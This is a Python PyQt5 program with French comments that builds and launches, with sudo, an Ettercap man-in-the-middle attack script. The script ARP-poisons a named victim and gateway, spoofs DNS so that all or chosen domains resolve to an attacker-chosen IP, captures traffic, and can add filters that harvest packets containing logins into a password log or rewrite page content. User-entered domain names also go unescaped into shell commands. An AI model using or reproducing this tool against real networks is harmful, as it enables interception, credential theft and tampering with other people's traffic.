#!/usr/bin/env python3
import sys, os, subprocess, re
from PyQt5.QtWidgets import (QApplication, QWidget, QLabel, QLineEdit, QCheckBox,
                             QPushButton, QVBoxLayout, QHBoxLayout, QMessageBox)

# Déterminer le répertoire racine du programme (où se trouve ce script)
SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
SCRIPT_PATH = os.path.join(SCRIPT_ROOT, "generated_mitm_script.sh")

# Blocs de code pour les options
VERBOSE_BLOCK = "set -x\n"

# Bloc DNS spoofing général (redirection de toutes les requêtes vers REDIR_IP)
DNS_BLOCK = """echo "[*] Création d'un fichier DNS personnalisé..."
cat <<EOF > "$TEMP_DNS"
* A $REDIR_IP
EOF
if [ ! -f "$BACKUP_DNS" ]; then
    echo "[*] Sauvegarde du fichier DNS original..."
    cp "$ETTER_DNS" "$BACKUP_DNS"
fi
echo "[*] Mise en place du DNS spoofing général (toutes les résolutions pointeront vers $REDIR_IP)..."
cp "$TEMP_DNS" "$ETTER_DNS"
"""
DNS_RESTORE = """echo "[*] Restauration du fichier DNS original..."
cp "$BACKUP_DNS" "$ETTER_DNS"
rm -f "$TEMP_DNS"
"""

# Bloc de redirection personnalisée pour un domaine spécifique
CUSTOM_DNS_BLOCK = """echo "[*] Activation de la redirection personnalisée pour {custom_source}..."
# On ajoute la redirection dans le fichier DNS temporaire
{custom_line}
"""

# Bloc capture trafic
CAPTURE_INFO = 'echo "[*] Le trafic sera enregistré dans : $CAPTURE_FILE"'

# Bloc filtre pour scan de mots de passe
FILTER_PASSWD_ECF = """cat <<EOF > /tmp/password_filter.ecf
if (search(DATA.data, "login"))
{
    log(DECODED.data, "/tmp/passwords.log");
    msg("Mot de passe potentiel détecté\\n");
}
EOF
etterfilter /tmp/password_filter.ecf -o /tmp/password_filter.ef
"""
FILTER_PASSWD_OPTION = "-F /tmp/password_filter.ef"
FILTER_PASSWD_CLEANUP = "rm -f /tmp/password_filter.ecf /tmp/password_filter.ef"

# Bloc filtre pour injection de contenu
FILTER_INJECTION_ECF = """cat <<EOF > /tmp/injection_filter.ecf
if (search(DATA.data, "Hello"))
{
    replace("Hello", "Hacked");
    msg("Injection de contenu effectuée\\n");
}
EOF
etterfilter /tmp/injection_filter.ecf -o /tmp/injection_filter.ef
"""
FILTER_INJECTION_OPTION = "-F /tmp/injection_filter.ef"
FILTER_INJECTION_CLEANUP = "rm -f /tmp/injection_filter.ecf /tmp/injection_filter.ef"

# Template du script Bash final
SCRIPT_TEMPLATE = """#!/bin/bash
{verbose_block}
# Script généré automatiquement par l'interface PyQt5

INTERFACE="{interface}"
GATEWAY="{gateway}"
VICTIME="{victime}"
REDIR_IP="{redir_ip}"

CAPTURE_FILE="/tmp/capture.pcap"
ETTER_DNS="/etc/ettercap/etter.dns"
BACKUP_DNS="/etc/ettercap/etter.dns.bak"
TEMP_DNS="/tmp/etter.dns"

{dns_block}
{custom_dns_block}

echo "[*] Lancement d'Ettercap en mode texte (ARP poisoning)..."
echo "    Passerelle : $GATEWAY"
echo "    Victime    : $VICTIME"
echo "    Interface  : $INTERFACE"
{capture_info}
{filter_info}
echo "Appuyez sur Ctrl+C pour arrêter l'attaque."

sudo ettercap -T -i "$INTERFACE" {w_option} -M arp:remote /$GATEWAY/ /$VICTIME/

echo "[*] Attaque terminée."
{dns_restore}
{filter_cleanup}
"""

class ScriptGenerator(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
    
    def initUI(self):
        self.setWindowTitle("Générateur de script MITM (Ettercap)")
        
        # Champs de saisie pour les paramètres principaux
        self.interface_label = QLabel("Interface:")
        self.interface_edit = QLineEdit()
        self.interface_edit.setPlaceholderText("ex. eth0 ou wlan0")
        
        self.gateway_label = QLabel("Gateway (Passerelle):")
        self.gateway_edit = QLineEdit()
        self.gateway_edit.setPlaceholderText("ex. 10.0.26.254")
        
        self.victime_label = QLabel("Victime:")
        self.victime_edit = QLineEdit()
        self.victime_edit.setPlaceholderText("ex. 10.0.26.66")
        
        self.redir_label = QLabel("IP de redirection par défaut:")
        self.redir_edit = QLineEdit()
        self.redir_edit.setPlaceholderText("ex. 10.0.26.181")
        
        # Options de redirection personnalisée
        self.custom_dns_checkbox = QCheckBox("Activer redirection personnalisée")
        self.custom_source_label = QLabel("Domaine source:")
        self.custom_source_edit = QLineEdit()
        self.custom_source_edit.setPlaceholderText("ex. google.com")
        self.custom_target_label = QLabel("Cible (IP ou domaine):")
        self.custom_target_edit = QLineEdit()
        self.custom_target_edit.setPlaceholderText("ex. github.com ou 192.168.1.100")
        
        # Options supplémentaires
        self.dns_checkbox = QCheckBox("Activer DNS spoofing général")
        self.dns_checkbox.setChecked(True)
        
        self.capture_checkbox = QCheckBox("Capturer le trafic")
        self.capture_checkbox.setChecked(True)
        
        self.passwd_checkbox = QCheckBox("Activer scan de mots de passe")
        self.passwd_checkbox.setChecked(False)
        
        self.injection_checkbox = QCheckBox("Activer injection de contenu")
        self.injection_checkbox.setChecked(False)
        
        self.verbose_checkbox = QCheckBox("Mode verbose")
        self.verbose_checkbox.setChecked(False)
        
        # Boutons
        self.generate_button = QPushButton("Générer le script")
        self.generate_button.clicked.connect(self.generate_script)
        
        self.exec_button = QPushButton("Exécuter le script")
        self.exec_button.clicked.connect(self.execute_script)
        self.exec_button.setEnabled(False)
        
        # Mise en forme de l'interface
        layout = QVBoxLayout()
        layout.addLayout(self.create_form_row(self.interface_label, self.interface_edit))
        layout.addLayout(self.create_form_row(self.gateway_label, self.gateway_edit))
        layout.addLayout(self.create_form_row(self.victime_label, self.victime_edit))
        layout.addLayout(self.create_form_row(self.redir_label, self.redir_edit))
        
        layout.addWidget(self.dns_checkbox)
        layout.addWidget(self.custom_dns_checkbox)
        layout.addLayout(self.create_form_row(self.custom_source_label, self.custom_source_edit))
        layout.addLayout(self.create_form_row(self.custom_target_label, self.custom_target_edit))
        
        layout.addWidget(self.capture_checkbox)
        layout.addWidget(self.passwd_checkbox)
        layout.addWidget(self.injection_checkbox)
        layout.addWidget(self.verbose_checkbox)
        
        layout.addWidget(self.generate_button)
        layout.addWidget(self.exec_button)
        
        self.setLayout(layout)
        self.resize(500, 450)
    
    def create_form_row(self, label, widget):
        hbox = QHBoxLayout()
        hbox.addWidget(label)
        hbox.addWidget(widget)
        return hbox
    
    def generate_script(self):
        # Récupérer les valeurs
        interface = self.interface_edit.text().strip()
        gateway = self.gateway_edit.text().strip()
        victime = self.victime_edit.text().strip()
        redir_ip = self.redir_edit.text().strip()
        
        if not all([interface, gateway, victime, redir_ip]):
            QMessageBox.warning(self, "Erreur", "Veuillez remplir tous les champs principaux.")
            return
        
        # Récupérer les options supplémentaires
        dns_enabled = self.dns_checkbox.isChecked()
        capture_enabled = self.capture_checkbox.isChecked()
        passwd_enabled = self.passwd_checkbox.isChecked()
        injection_enabled = self.injection_checkbox.isChecked()
        verbose_enabled = self.verbose_checkbox.isChecked()
        custom_enabled = self.custom_dns_checkbox.isChecked()
        
        # Bloc verbose
        verbose_block = VERBOSE_BLOCK if verbose_enabled else ""
        
        # Bloc DNS général
        dns_block = DNS_BLOCK if dns_enabled else ""
        dns_restore = DNS_RESTORE if dns_enabled else ""
        
        # Bloc redirection personnalisée
        custom_dns_block = ""
        if custom_enabled:
            custom_source = self.custom_source_edit.text().strip()
            custom_target = self.custom_target_edit.text().strip()
            if not all([custom_source, custom_target]):
                QMessageBox.warning(self, "Erreur", "Veuillez remplir les champs pour la redirection personnalisée.")
                return
            # Vérifier si custom_target ressemble à une IP
            if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', custom_target):
                custom_line = f'echo "{custom_source} A {custom_target}" >> "$TEMP_DNS"\necho "www.{custom_source} A {custom_target}" >> "$TEMP_DNS"'
            else:
                # Utiliser la commande host pour résoudre le domaine cible
                custom_line = f'TARGET_IP=$(host {custom_target} | grep "has address" | head -n1 | awk \'{{print $4}}\')\n'
                custom_line += f'echo "{custom_source} A $TARGET_IP" >> "$TEMP_DNS"\n'
                custom_line += f'echo "www.{custom_source} A $TARGET_IP" >> "$TEMP_DNS"'
            custom_dns_block = CUSTOM_DNS_BLOCK.format(custom_source=custom_source, custom_line=custom_line)
        # Sinon, reste vide
        # Option de capture
        if capture_enabled:
            capture_option = '-w "$CAPTURE_FILE"'
            capture_info = CAPTURE_INFO
        else:
            capture_option = ""
            capture_info = 'echo "[*] La capture de trafic est désactivée."'
        
        # Gestion des filtres pour scan de mots de passe et injection
        filter_options = ""
        filter_info_msgs = []
        filter_cleanup_cmds = []
        filter_blocks = ""
        
        if passwd_enabled:
            filter_blocks += FILTER_PASSWD_ECF + "\n"
            filter_options += " " + FILTER_PASSWD_OPTION
            filter_info_msgs.append("[*] Scan de mots de passe activé.")
            filter_cleanup_cmds.append(FILTER_PASSWD_CLEANUP)
        else:
            filter_info_msgs.append("[*] Scan de mots de passe désactivé.")
        
        if injection_enabled:
            filter_blocks += FILTER_INJECTION_ECF + "\n"
            filter_options += " " + FILTER_INJECTION_OPTION
            filter_info_msgs.append("[*] Injection de contenu activée.")
            filter_cleanup_cmds.append(FILTER_INJECTION_CLEANUP)
        else:
            filter_info_msgs.append("[*] Injection de contenu désactivée.")
        
        filter_info = "\n".join([f'echo "{msg}"' for msg in filter_info_msgs])
        filter_cleanup = "\n".join(filter_cleanup_cmds)
        
        # Combine les options capture et filtres pour la commande Ettercap
        if capture_option or filter_options:
            w_option = f"{capture_option} {filter_options}"
        else:
            w_option = ""
        
        # Assemblage final du script
        script_content = SCRIPT_TEMPLATE.format(
            verbose_block=verbose_block,
            interface=interface,
            gateway=gateway,
            victime=victime,
            redir_ip=redir_ip,
            dns_block=dns_block,
            custom_dns_block=custom_dns_block,
            capture_info=capture_info,
            filter_info=filter_info,
            w_option=w_option,
            dns_restore=dns_restore,
            filter_cleanup=filter_cleanup
        )
        
        if filter_blocks:
            script_content = filter_blocks + "\n" + script_content
        
        try:
            with open(SCRIPT_PATH, "w") as f:
                f.write(script_content)
            os.chmod(SCRIPT_PATH, 0o755)
            QMessageBox.information(self, "Succès", f"Script généré avec succès à {SCRIPT_PATH}")
            self.exec_button.setEnabled(True)
        except Exception as e:
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la génération du script : {e}")
    
    def execute_script(self):
        reply = QMessageBox.question(
            self,
            "Exécution du script",
            "L'exécution du script nécessite des privilèges root. Voulez-vous continuer ?",
            QMessageBox.Yes | QMessageBox.No
        )
        if reply == QMessageBox.No:
            return
        
        try:
            subprocess.run(["sudo", SCRIPT_PATH])
        except Exception as e:
            QMessageBox.critical(self, "Erreur", f"Erreur lors de l'exécution du script : {e}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = ScriptGenerator()
    window.show()
    sys.exit(app.exec_())
